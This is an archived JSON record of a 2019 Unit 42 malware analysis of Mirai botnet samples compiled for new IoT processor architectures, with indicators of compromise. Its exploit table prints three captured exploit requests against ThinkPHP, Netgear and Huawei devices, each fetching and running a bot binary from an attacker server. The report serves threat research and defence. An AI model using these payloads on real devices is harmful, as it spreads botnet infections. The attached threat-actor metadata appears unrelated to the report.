{
    "id": "cdfac8f6-3aaf-4441-becb-2e15e1084c3d",
    "created_at": "2023-01-12T15:04:21.572081Z",
    "updated_at": "2025-03-27T02:08:40.363332Z",
    "deleted_at": null,
    "sha1_hash": "f49985062f1868f2268cd214e436504e1fb0036e",
    "title": "2019-04-08 - Mirai Compiled for New Processors Surfaces in the Wild",
    "authors": "",
    "file_creation_date": "2022-05-28T16:58:04Z",
    "file_modification_date": "2022-05-28T16:58:04Z",
    "file_size": 575588,
    "plain_text": "# Mirai Compiled for New Processors Surfaces in the Wild\n\n**[unit42.paloaltonetworks.com/mirai-compiled-for-new-processor-surfaces/](https://unit42.paloaltonetworks.com/mirai-compiled-for-new-processor-surfaces/)**\n\nRuchna Nigam April 8, 2019\n\nBy [Ruchna Nigam](https://unit42.paloaltonetworks.com/author/ruchna-nigam/)\n\nApril 8, 2019 at 6:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [botnet,](https://unit42.paloaltonetworks.com/tag/botnet/) [DDoS,](https://unit42.paloaltonetworks.com/tag/ddos/) [IoT,](https://unit42.paloaltonetworks.com/tag/iot/) [Linux,](https://unit42.paloaltonetworks.com/tag/linux/) [Mirai](https://unit42.paloaltonetworks.com/tag/mirai/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/mirai-compiled-for-new-processor-surfaces/)\n\n## Executive Summary\n\nIn late February 2019, Unit 42 discovered Mirai samples compiled for new processors/architectures not\n[previously seen before. Despite the source code being publicly released In October of 2016, the malware](https://krebsonsecurity.com/2016/10/source-code-for-iot-botnet-mirai-released/)\nhas, until now, only been found targeting a fixed set of processors/architectures.\n\nUnit 42 has found the newly discovered samples are compiled for Altera Nios II, OpenRISC, Tensilica\nXtensa, and Xilinx MicroBlaze processors. This is not the first time Mirai has been expanded for new\n[processor architectures, samples targeting ARC CPUs were discovered in January 2018. Yet this](https://www.theregister.co.uk/2018/01/16/arc_iot_botnet_malware/)\ndevelopment shows that Mirai developers continue to actively innovate, targeting a growing array of IoT\ndevices. The malware gained notoriety in 2016 for its use in massive denial of service attacks on Dyn and\nthe website of security blogger Brian Krebs. If the latest innovations lead to an increase in the number of\ninfected devices, that means that Mirai attackers would have access to additional firepower for use in denial\nof service attacks.\n\nIn this blog, we show the new features we’ve found in these new samples, discuss the infrastructure we\nobserved, show how other Mirai samples using known exploits were hosted on the same infrastructure as\nthe new samples, and give indicators of compromise (IoCs) for these new samples.\n\nTo protect against Mirai and other threats, organizations should make securing their IoT devices with the\nlatest updates and non-default passwords a priority.\n\n## New Features in these New Samples\n\nIn addition to the being compiled for these new architectures, we have found that these new samples also\ncontain the following new features:\n\nEncryption algorithm: These samples make use of a modified version of the standard byte-wise XOR\n[(as implemented in the toggle_obf function) used in the original Mirai source code.](https://github.com/jgamblin/Mirai-Source-Code/blob/6a5941be681b839eeff8ece1de8b245bcd5ffb02/mirai/bot/table.c#L138)\n\nIt uses 11 8-byte keys, all of which are cumulatively byte-wise XOR-ed to get the final resulting key. This is\nbetter illustrated in the code snippet below:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n\n\ntablekeys = [0xdeadbeef, 0x85DAB8BF, 0xDEEDEEBF, 0xDEABBEAF, 0xDBBD45BF, 0x246584EF,\n0x85BFE8BF, 0xD68395BF, 0xDBAAAAAF, 0x0DAABEEF]\n\nxor_key = 0\n\nfor key in tablekeys:\n\nxor_key ^= key&0xff ^ (key>>8 & 0xff) ^ (key>>16 & 0xfF) ^ (key>>24 & 0xff)\n\n\nThis is effectively the equivalent of a byte-wise XOR with 0x5A.\n\nattack_method_ovh: The samples include a DDoS attack option with the following parameters:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nATK_OPT_IP_TOS = 0\n\nATK_OPT_IP_IDENT = 0xFFFF\n\nATK_OPT_IP_TTL = 64\n\nATK_OPT_IP_DF = 1\n\nATK_OPT_SPORT = 0xFFFF\n\nATK_OPT_DPORT = 0xFFFF\n\nATK_OPT_SEQRND = 0xFFFF\n\nATK_OPT_ACKRND = 0\n\nATK_OPT_URG = 0\n\nATK_OPT_ACK = 0\n\nATK_OPT_PSH = 0\n\nATK_OPT_RST = 0\n\nATK_OPT_SYN = 1\n\nATK_OPT_FIN = 0\n\nATK_OPT_SOURCE = LOCAL_ADDR\n\n\n[These are the exact same parameters as the attack method “TCP SYN” (attack_method_tcpsyn) in the](https://github.com/jgamblin/Mirai-Source-Code/blob/6a5941be681b839eeff8ece1de8b245bcd5ffb02/mirai/bot/attack_tcp.c#L18)\noriginal Mirai source, so the reason behind incorporating a new attack method with the same parameters\nremains unclear.\n\nPivoting on this attack method in AutoFocus, we found samples circulating in the wild since November\n2018 for other previously known architectures also employing it.\n\n## Infrastructure\n\nWe found these latest samples on a single IP that at one point of time was hosting them via an open\ndirectory; however, on February 22, 2019, the server was later updated to hide the file listing but continued\nto host the files themselves.\n\n\n-----\n\n_Figure 1. Open directory hosting samples of the Mirai variant_\n\nPrior to the update on February 22, the same IP was hosting Mirai samples containing the following exploits\nknown to be used in previous versions of Mirai. The presence of these exploits in both previous versions of\nMirai and our newly discovered samples help show the tie between the two are likely used by the same\nattacker in this case These exploits are shown in Table 1 below\n\n\n-----\n\n**Vulnerability** **Exploit Format**\n\n\nThinkPHP\nRemote\nCode\nExecution\n\nD-Link\nDSL2750B\nOS\nCommand\nInjection\n\nNetgear\nRemote\nCode\nExecution\n\n\nGET /to/thinkphp5.1.29/?s=index/\nhinkContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=\n'wget http://178.62.227[.]13/wrgjwrgjwrg246356356356/hx86 -O /tmp/Hito; chmod 777\n/tmp/Hito; /tmp/Hito wget.exploit.selfrep.thinkphp' HTTP/1.1\nConnection: keep-alive\n\nAccept-Encoding: gzip, deflate\n\nAccept: /\n\nUser-Agent: Hito/2.0\n\nGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+rf+/tmp/*;/bin/busybox+wget+-g+178.62.227[.]13+-l+/tmp/binary+r+/wrgjwrgjwrg246356356356/hmips;+/bin/busybox+chmod\n777+*+/tmp/binary;/tmp/binary+wget.selfrep.exploit.netgear&curpath=/&currentsetting.htm=1\nHTTP/1.0\n\n\n-----\n\nCVE-20148361\n\nCVE-201717215\n\n\nPOST /ctrlt/DeviceUpgrade_1 HTTP/1.1\nContent-Length: 430\n\nConnection: keep-alive\n\nAccept: */*\n\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\",\nnonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\",\nresponse=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\",\nnc=00000001, cnonce=\"248d1a2560100669\"\n\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"\ns:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade\nxmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n<NewStatusURL>$(/bin/busybox wget -g 178.62.227.13 -l /tmp/binary -r\n/wrgjwrgjwrg246356356356/hmips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary\nwget.selfrep.exploit.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)\n</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\n\n\n_Table 1. Exploits in Mirai variant hosted at 178.62.227[.]13 prior to February 22_\n\n## Conclusion\n\n\n-----\n\nGiven that the Mirai source code is open source, something as elementary as compiling the same source\ncode for a larger range of processors provides attackers with the advantage of a larger attack surface.\nPractically, this means that the family can now infect and propagate via a larger number of embedded\ndevices, affording attackers greater DDoS firepower.\n\nPalo Alto Networks customers are protected by:\n\nWildFire detects all related samples with malicious verdicts.\nAll exploits and IPs/URLs involved in these campaigns are blocked through Threat Prevention and\nPANDB.\n\nAutoFocus customers can track the exploits mentioned using the following tags:\n\n[ThinkPHP RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ThinkPHP_RCE)\n[DLinkDSL2750BOSCmdInjection](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DLinkDSL2750BOSCmdInjection)\n[Netgear RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.NetgearRCE)\n[CVE-2014-8361](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2014-8361)\n[CVE-2017-17215](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2017-17215)\n\n[The malware family can be tracked in AutoFocus using the tag ELFMirai](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ELFMirai)\n\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this\nreport with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy\nprotections to their customers and to systematically disrupt malicious cyber actors. For more information on\n[the Cyber Threat Alliance, visit www.cyberthreatalliance.org.](http://www.cyberthreatalliance.org/)\n\n## Indicators of Compromise\n\n**URLs**\n\n178[.]62.227.13/wrgjwrgjwrg246356356356/hmicroblazebe\n\n178[.]62.227.13/wrgjwrgjwrg246356356356/hmicroblazeel\n\n178[.]62.227.13/wrgjwrgjwrg246356356356/hnios2\n\n178[.]62.227.13/wrgjwrgjwrg246356356356/hopenrisc\n\n178[.]62.227.13/wrgjwrgjwrg246356356356/hxtensa\n\n**Xilinx MicroBlaze Samples**\n\n006b73c03760f168a5d71c0edd50e9a437aca7b3db1dbecac75ea2ef9e74f54f\n\n233790b3a74245c4660cadec23145246484154abd01edd45836c31598f96b13d\n\n26298ff73035ef2dc92cda118d476933d3014b39ac478865bd86d28aa5457459\n\n2d7ed9ccd1b94f58aff30f7a7d798dd03b6a0f5bed2a529e1e13d8d78e9ae289\n\n3891a82075bd173bb1e052c27f1be946559aaeb65e6a4c761ba8bbd2cbccd3fb\n\n43c5efda1875fd809f97b49d296f34e1292ed86e5a4197460764fe67b98294ef\n\n\n-----\n\n44f1d6144df90adea1b7b482c84946257c9fb70a9c195a6846f416de80b5e6fd\n\n4cb4c5cbf7eb646bdc08640f4f9e9a4383a9c7ac4e26be0caeb9dc904670c5bf\n\n4d8a4841a2f4a61ed6df2be79dd7ea1eb2052cee6eba4d8de30add7908ebb779\n\n537c2d136a805fe1b703709b0794e25f91f2136027287fa4817080330c7989ce\n\n683b6f8209725ae0e715cda5a1cd35bcaacb5d45ae8e487c98dce2c01c91c887\n\n9b1eab0283fd6948a9a181abaa2f6b3c26f2b0077c8a8b32e763790dd64d2a22\n\na736d6ebf9596872f3c92ac486be2588ccf0c53cf15a3897a97c83ca1525ff8d\n\na9dbcc2681d427f9820ca9c5ec120b9bf3e83c9856e89736884ee4dc26712e50\n\nbdd19fa8a7c0e3a5ebbb14d5885cb09a863122ad2c78f53361db0c194045d491\n\nc0f18a5113b341faacb9f647cee954a237925cc62d5daff559a8a880702273c1\n\nc75b3c52c0f5eebfd4c44c3069a393e824d455c7405d57ee99fd7613b8211b31\n\nd28d05477ddbb1e3de330e98a2cb199ed76df0d1c942c467c977c9b70771477a\n\nde6a0d2b8b4323bc06a6cd02b0042fc92c36319696dafafd057e905d359f60ea\n\ne740f780f2b91a41c5024115bbed607b0a75e52fcf4f96b86d0f8adda0c97ddf\n\n**OpenRISC Samples**\n\n09f8885872bc47e03608d6725f8735074c8b915ca08540e367921223058c108a\n\n199f1976cb5fb39a9c395a28e2178476b6eaec0f3499a5a11912f103dcd64d00\n\n1efdfc79d0c4b779966dfcae7d4f0a1f17f043e098ec0f90ff12a7ebc3c3f1f1\n\n24b4c838dd41c0d812f747e48cf24be4f2265bce8f1e4d0d8ca6a7fc5649019b\n\n59b7a7baf4c239786fdf5ceca9084d829c6f6fc0603a524df313b2ef4958e4c2\n\n6183c7c87ff7cc3721c000af73714be27884a22057c4dc69bccd34571353f327\n\n74a45ff17678e0bddf383b5229785dda04c515e778bc9421d9396168f1cf3c3d\n\n76c9e543a0386994031b4905533eccd05400b3bb12fefc94f1eb65af5debe986\n\nb6359a84bd36a3ce8a13f1306ad74d757c384a772691c228c9a00a5246d828fa\n\nb758405fd18c4518878868163472bcb4e988e4ecbc3312b9756d231b80646816\n\nb89196b9773c6c809a2547434ce3e9de8a494ed7b338e013fd3f2818b4b54fd1\n\nc33080bea85616fd1251f877cd9ff570dd6a2e2f24cc20254754cb2c74a2375e\n\nd21880f4f919c410d0f2ee447716a2f7288dbaa21ec7de8601f0fc999b4d3d45\n\n\n-----\n\nf646c45feb0ccab4caf61bdb4aa45b0295614b2e881ad9c594ccaec2ea886671\n\n**Tensilica Xtensa Samples**\n\n006436f282f46f49eb97c2e119622ac61086a908623ca741eb29caeca22c797a\n\n28bb80c687cb0aeea0b2d53dd5bf34f21f7292e5708b0aefeea25aebe2ff93af\n\n5647168f9818dc40599d057c426424709bde5722c62088ecff64b97d3acfc4a7\n\n57cc6875ae0c571ef1edaae72d82b0da6e60331ad4b3ad34c922b9e4612b8779\n\n61893583675935ac7a4857542f13d513ffbb176b302a72d26d7ec39fd931decb\n\nac4a00bfe1031e19eb9a101d61ef5267627ebaeb2aca4b962c7bb1b5a59e337c\n\nb0cef399ea8ec2244aebb3506a2bb60c64c3921e816c0fc9752caf84c6cf196d\n\nb5da0b6070d9cf3a3d628864e0f0860c8fc967ce692c0142f5a6dafee64079f6\n\n**Altera Nios II Samples**\n\n0c35f2902d92ef4f46e4643d11c46bde57027bb14e2b75c027a50fe7efc4f358\n\n3446c2ed11a6a5e02702afd5f7082eb435b2922096443cabd45d54b5b7582cc1\n\n48c760ba6b6a29e2a90bdb88bf96486c158f2b47ee9e1c560a47071e39bb5e87\n\n5876c9ac609ece0e051c57b380489490bc78e40c796b637af1e80adbdb9f70dc\n\na457090fb6df8cb93c91ec6b5d89927f7a6f9e247389d945d44731351a367b4e\n\ned5e313821bf3a20d226c1b5f2b0ba7f1897d0778c27620017b852579e3e1894\n\nfae498477388c53c8c623fd8ddb710cc286584200767907b104d55f916d37c05\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-04-08 - Mirai Compiled for New Processors Surfaces in the Wild.pdf"
    ],
    "report_names": [
        "2019-04-08 - Mirai Compiled for New Processors Surfaces in the Wild.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535861,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653757084,
    "ts_modification_date": 1653757084,
    "files": {
        "pdf": "https://archive.orkl.eu/f49985062f1868f2268cd214e436504e1fb0036e.pdf",
        "text": "https://archive.orkl.eu/f49985062f1868f2268cd214e436504e1fb0036e.txt",
        "img": "https://archive.orkl.eu/f49985062f1868f2268cd214e436504e1fb0036e.jpg"
    }
}